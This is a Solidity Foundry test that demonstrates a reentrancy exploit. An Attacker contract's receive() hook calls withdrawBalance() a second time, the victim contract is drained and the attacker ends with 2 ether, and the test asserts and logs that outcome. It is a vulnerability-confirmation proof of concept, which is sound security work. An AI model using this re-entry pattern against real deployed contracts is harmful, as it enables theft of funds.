// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_simple.sol";

contract Attacker {
    Reentrance public victim;
    uint public attackCount;

    constructor(Reentrance _victim) {
        victim = _victim;
    }

    function deposit(uint amount) public {
        require(address(this).balance >= amount, "insufficient balance");
        victim.addToBalance{value: amount}();
    }

    function attack() public {
        victim.withdrawBalance();
    }

    receive() external payable {
        attackCount++;
        if (attackCount < 2) {
            victim.withdrawBalance();
        }
    }
}

contract ReentrancyTest is Test {
    Reentrance public victim;
    Attacker public attacker;
    uint constant DEPOSIT_AMOUNT = 1 ether;

    function setUp() public {
        victim = new Reentrance();
        attacker = new Attacker(victim);
        
        vm.deal(address(attacker), DEPOSIT_AMOUNT);
        attacker.deposit(DEPOSIT_AMOUNT);
        
        vm.deal(address(this), DEPOSIT_AMOUNT);
        victim.addToBalance{value: DEPOSIT_AMOUNT}();
    }

    function testReentrancyVulnerability() public {
        // Take state snapshot BEFORE attack
        console.log("--- BEFORE-Trigger Operation ---");
        uint contractBalanceBefore = victim.getContractBalance();
        uint attackerDepositBefore = victim.getBalance(address(attacker));
        uint totalWithdrawalsBefore = victim.totalWithdrawals();
        
        console.log("Contract ETH Balance Before:\t", contractBalanceBefore);
        console.log("Attacker Deposit Balance Before: ", attackerDepositBefore);
        console.log("Total Withdrawals Before:\t", totalWithdrawalsBefore);
        
        uint attackerBalanceBefore = address(attacker).balance;
        console.log("Attacker ETH Balance Before:\t", attackerBalanceBefore);
        
        // Execute attack
        console.log("--- Trigger Operation ---");
        attacker.attack();

        // Take state snapshot AFTER attack
        console.log("--- AFTER-Trigger Operation ---");
        uint contractBalanceAfter = victim.getContractBalance();
        uint attackerDepositAfter = victim.getBalance(address(attacker));
        uint totalWithdrawalsAfter = victim.totalWithdrawals();
        
        console.log("Contract ETH Balance After:\t", contractBalanceAfter);
        console.log("Attacker Deposit Balance After: ", attackerDepositAfter);
        console.log("Total Withdrawals After:\t", totalWithdrawalsAfter);
        
        uint attackerBalanceAfter = address(attacker).balance;
        console.log("Attacker ETH Balance After:\t", attackerBalanceAfter);
        
        // Differential comparison
        bool contractDrained = contractBalanceAfter == 0;
        bool depositReset = attackerDepositAfter == 0;
        bool withdrawalsIncreased = totalWithdrawalsAfter == totalWithdrawalsBefore + 2 * DEPOSIT_AMOUNT;
        
        // Verification and judgement
        if (contractDrained && depositReset && withdrawalsIncreased) {
            console.log("VULNERABILITY CONFIRMED: Contract drained, deposit reset, and withdrawals increased twice");
            console.log("Vulnerability Exists: Reentrancy allows double withdrawal draining contract");
        } else {
            console.log("VULNERABILITY NOT CONFIRMED: State changes don't match reentrancy pattern");
            console.log("Vulnerability not Exist: Failed to exploit reentrancy condition");
        }
        
        // Original assertions remain for test integrity
        assertEq(contractBalanceAfter, 0, "Victim should be drained");
        assertEq(attackerDepositAfter, 0, "Attacker balance not reset");
        assertEq(attackerBalanceAfter, 2 * DEPOSIT_AMOUNT, "Attacker should have 2 ether after attack");
    }
}